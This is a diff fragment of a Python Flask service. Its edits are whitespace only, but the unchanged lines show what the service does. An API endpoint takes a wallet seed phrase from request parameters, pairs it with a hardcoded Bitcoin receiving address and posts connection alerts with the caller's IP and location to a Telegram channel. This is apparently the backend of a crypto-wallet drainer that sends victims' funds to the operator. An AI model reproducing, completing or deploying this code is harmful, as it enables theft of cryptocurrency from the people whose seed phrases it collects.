@@ -17,7 +17,7 @@ app = Flask(__name__)
 # stupid ass functions
 def tg_notify(message):
     api_url = f'https://api.telegram.org/bot{api_key}/sendMessage'
-    
+
     try:
         response = requests.post(api_url, json={'chat_id': channel_id, 'parse_mode': 'Markdown', 'text': message})
         print(response.text)
@@ -62,7 +62,7 @@ def api():
         else:
             notification = f'*Success - Connection Established (1/3)*\n\nSomeone connected to the API with a valid API key.\n\nIP: {current_ip()}\nLocation: {ip_location(current_ip())}'
             tg_notify(str(notification))
-        
+
         # Get seed phrase and receiver
         seedphrase = request.args.get('seedphrase')
         receiver = 'bc1qxscpemwgeknfkljers8xhvqv2rrp3057gtc9xv'
@@ -132,7 +132,7 @@ if __name__ == '__main__':
     # define the host and ip
     host_ip = urllib.request.urlopen('https://v4.ident.me').read().decode('utf8')
     host_port = '5000'
-    
+
     try:
         # run the app
         app.run(host=host_ip, port=host_port)
